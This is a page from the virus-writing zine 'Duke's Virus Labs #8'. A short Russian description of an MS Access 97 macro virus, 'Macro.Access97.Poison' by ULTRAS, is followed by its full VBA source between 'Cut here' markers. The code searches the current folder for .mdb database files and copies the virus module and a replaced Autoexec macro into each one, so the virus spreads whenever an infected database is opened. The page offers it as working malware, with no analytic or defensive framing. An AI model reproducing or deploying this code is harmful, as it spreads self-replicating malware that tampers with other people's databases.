- [Duke's Virus Labs #8] - [Page 22] -

Macro.Access97.Poison
(c) by ULTRAS


   Заражает базы данных MS Access. При заражении баз данных замещает скрипт
Autoexec и копирует в базу дополнительный форму с именем "AcPoison". Модуль
вируса содержит одну подпрограмму:

ULTRAS

При открытии зараженной базы автоматически загружается подпрограмма "ULTRAS"
которая ищет и заражает базы данных в текущем каталоге (файлы с расширением
имени .MDB).

===== Cut here =====
Attribute VB_Name = "ULTRAS"
Option Compare Database
Option Explicit
Function ULTRAS()
'POiSoN BY ULTRAS
'ultras2@usa.net
On Error Resume Next
Dim U, FName, CDName, Infect, POiSON As String
Infect = False
CDName = CurDir & "\"
FName = Dir(CDName & "*.mdb")
If FName <> "" Then
POiSON = CDName & FName
For U = 1 To Application.Modules.Count
If Application.Modules(U).Name = "AcPoison" Then
Infect = True
End If
Next
End If
If Infect = False Then
Application.DoCmd.TransferDatabase acExport, "Microsoft Access", POiSON, acModule, "AcPoison", "AcPoison"
Application.DoCmd.TransferDatabase acExport, "Microsoft Access", POiSON, acMacro, "Autoexec", "Autoexec"
End If
End Function
===== Cut here =====
